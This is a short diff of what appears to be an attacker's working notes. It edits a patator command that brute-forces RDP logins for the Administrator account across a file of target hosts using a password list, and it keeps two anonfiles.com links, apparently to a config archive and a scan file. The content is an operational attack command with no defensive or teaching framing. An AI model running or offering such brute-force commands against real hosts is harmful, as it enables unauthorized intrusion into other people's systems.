@@ -1,4 +1,4 @@
-python3.7 patator.py rdp_login host=FILE0 0=hostrdp.txt user=Administrator password=FILE1 1=haslo.txt -l /home/rdp100422/ --max-retries 10
+python3.7 patator.py rdp_login host=FILE0 0=save123.txt user=Administrator password=FILE1 1=haslo.txt -L / --max-retries 5
 
 https://anonfiles.com/jdx187Vbx5/config_rar
 https://anonfiles.com/3ap95cVax5/scan2_txt
